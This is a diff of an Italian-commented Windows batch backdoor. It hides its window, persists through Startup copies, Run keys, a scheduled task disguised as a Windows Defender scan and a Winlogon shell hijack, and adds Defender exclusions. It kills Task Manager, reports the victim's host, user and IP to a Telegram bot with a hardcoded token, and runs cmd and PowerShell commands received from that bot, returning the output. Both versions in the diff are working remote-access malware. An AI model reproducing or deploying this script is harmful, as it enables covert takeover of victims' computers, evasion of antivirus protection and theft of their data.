@@ -1,83 +1,82 @@
-@echo off
-:: INIZIALIZZAZIONE STEALTH
-if not "%1"=="--ghost" (
-    call :makeInvisible
-    exit
-)
+@echo off & setlocal enableextensions enabledelayedexpansion
 
-:: CONFIGURAZIONE BOT (sostituisci con i tuoi dati)
+::: ### FASE 1 - INSTALLAZIONE INVISIBILE ###
+if "%~1"=="--ghost" goto ghost_mode
+
+::: ### Tecnica per nascondere completamente il CMD ###
+echo Set objWSH = CreateObject("WScript.Shell") > "%TEMP%\invisible.vbs"
+echo objWSH.Run "%~f0 --install", 0, False >> "%TEMP%\invisible.vbs"
+wscript.exe "%TEMP%\invisible.vbs" & exit /b
+
+:install
+::: ### PERSISTENZA AVANZATA ###
+:: 1. Copia in Startup (nome legittimo)
+copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderHelper.bat" >nul 2>&1
+
+:: 2. Aggiungi al Run (Registry)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderUpdate" /t REG_SZ /d "\"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderHelper.bat\"" /f >nul 2>&1
+
+:: 3. Task Scheduler (avvio a ogni login)
+schtasks /create /tn "Microsoft\Windows Defender\MP Scheduled Scan" /tr "'%~f0' --ghost" /sc onlogon /ru System /f >nul 2>&1
+
+:: 4. Esclusione da Windows Defender
+powershell -nop -c "Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'; Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1
+
+::: ### RIAVVIO IN MODALITÀ INVISIBILE ###
+start "" /B "%~f0" --ghost & exit /b
+
+::: ### FASE 2 - BACKDOOR INVISIBILE ###
+:ghost_mode
+::: ### CONFIGURAZIONE BOT ###
 set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
 set "CHAT_ID=5709299213"
 set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"
 
-:: AVVIO INVISIBILE
-:ghostMode
-setlocal enabledelayedexpansion
+::: ### Notifica connessione (con info sistema) ###
+for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set "IP=%%b"
+powershell -nop -c "$msg='🖥️ [%COMPUTERNAME%] - %USERNAME% online | IP: %IP%'; $null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=$msg' -UseBasicParsing"
 
-:: MECCANISMI DI PERSISTENZA (3 livelli)
-call :addPersistence
+::: ### ANTI-DEBUGGING ###
+:: Termina task manager e process hacker
+taskkill /f /im taskmgr.exe >nul 2>&1
+taskkill /f /im ProcessHacker.exe >nul 2>&1
 
-:: NOTIFICA DI ATTIVAZIONE
-powershell -nop -c "$null=Invoke-RestMethod -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=✅ [%COMPUTERNAME%] - Backdoor attiva (User: %USERNAME%)' -UseBasicParsing"
+::: ### MAIN LOOP ###
+:command_loop
+set "CMD="
 
-:: LOOP PRINCIPALE
-:mainLoop
-for /f "delims=" %%A in ('powershell -nop -c "$r=try{irm '!API_URL!/getUpdates?offset=-1' -UseBasicParsing|ConvertFrom-Json}catch{};$r.result[-1].message.text"') do (
-    set "cmd=%%A"
+::: ### Ricevi comandi da Telegram ###
+for /f "delims=" %%A in ('powershell -nop -c "$resp=try{Invoke-WebRequest -Uri '!API_URL!/getUpdates?offset=-1' -UseBasicParsing|ConvertFrom-Json}catch{}; $resp.result[-1].message.text"') do (
+    set "CMD=%%A"
 )
 
-if "!cmd!"=="exit" (
-    powershell -nop -c "irm '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=❌ Sessione terminata' -UseBasicParsing"
-    exit
-) else if "!cmd!"=="kill" (
-    taskkill /f /im taskmgr.exe /im cmd.exe /im powershell.exe >nul 2>&1
-) else if "!cmd:~0,4!"=="cmd:" (
-    set "exec=!cmd:~4!"
-    for /f "delims=" %%B in ('!exec! 2^>^&1') do set "out=%%B"
-    powershell -nop -c "irm '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=!out!' -UseBasicParsing"
+::: ### Esegui comandi ###
+if defined CMD (
+    if "!CMD!"=="exit" (
+        powershell -nop -c "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=❌ Session terminated' -UseBasicParsing"
+        exit
+    )
+
+    if "!CMD:~0,4!"=="cmd:" (
+        set "COMMAND=!CMD:~4!"
+        for /f "delims=" %%B in ('cmd /c "!COMMAND! 2^>^&1"') do set "OUT=%%B"
+        powershell -nop -c "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=!OUT!' -UseBasicParsing"
+    )
+
+    if "!CMD:~0,3!"=="ps:" (
+        set "PS_CMD=!CMD:~3!"
+        powershell -nop -c "$out=try{iex '!PS_CMD!'|Out-String}catch{'ERROR: '+$$_};$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=$$out' -UseBasicParsing"
+    )
+
+    if "!CMD!"=="selfdestruct" (
+        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderUpdate" /f >nul 2>&1
+        schtasks /delete /tn "Microsoft\Windows Defender\MP Scheduled Scan" /f >nul 2>&1
+        del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderHelper.bat" >nul 2>&1
+        powershell -nop -c "Remove-Item -Path '%~f0' -Force -ErrorAction SilentlyContinue"
+        exit
+    )
 )
 
-:: RITARDO ANTI-DEBUG (7-15 secondi)
+::: ### Delay randomico (evita detection) ###
 powershell -nop -c "Start-Sleep -Seconds (Get-Random -Minimum 7 -Maximum 15)"
-goto mainLoop
-
-:: FUNZIONI =========================================
-
-:makeInvisible
-:: Crea shortcut nascosta nell'avvio
-echo Set oWS = WScript.CreateObject("WScript.Shell") > "%TEMP%\~tmpInvis.vbs"
-echo sLinkFile = "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.vbs" >> "%TEMP%\~tmpInvis.vbs"
-echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%TEMP%\~tmpInvis.vbs"
-echo oLink.TargetPath = "%~f0" >> "%TEMP%\~tmpInvis.vbs"
-echo oLink.Arguments = "--ghost" >> "%TEMP%\~tmpInvis.vbs"
-echo oLink.WindowStyle = 7 >> "%TEMP%\~tmpInvis.vbs"
-echo oLink.Save >> "%TEMP%\~tmpInvis.vbs"
-cscript //nologo "%TEMP%\~tmpInvis.vbs" & del "%TEMP%\~tmpInvis.vbs"
-
-:: Avvia la versione invisibile
-start "" /B wscript.exe "%~f0" --ghost
-exit /b
-
-:addPersistence
-:: 1. Startup Folder
-copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.bat" >nul 2>&1
-
-:: 2. Registry Run 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /t REG_SZ /d "\"%~f0\" --ghost" /f >nul 2>&1
-
-:: 3. Scheduled Task (avvio con privilegi)
-schtasks /create /tn "Microsoft\Windows Defender\MP Scheduled Scan" /tr "\"%~f0\" --ghost" /sc onlogon /ru SYSTEM /f >nul 2>&1
-
-:: 4. Winlogon Notify (tecnica avanzata)
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, %~f0" /f >nul 2>&1
-
-:: 5. Disabilita Windows Defender
-powershell -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath '%APPDATA%'" >nul 2>&1
-exit /b
-
-:cleanup
-:: Auto-pulizia in caso di comando "exit"
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f >nul 2>&1
-del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.bat" >nul 2>&1
-schtasks /delete /tn "Microsoft\Windows Defender\MP Scheduled Scan" /f >nul 2>&1
-exit
+goto command_loop
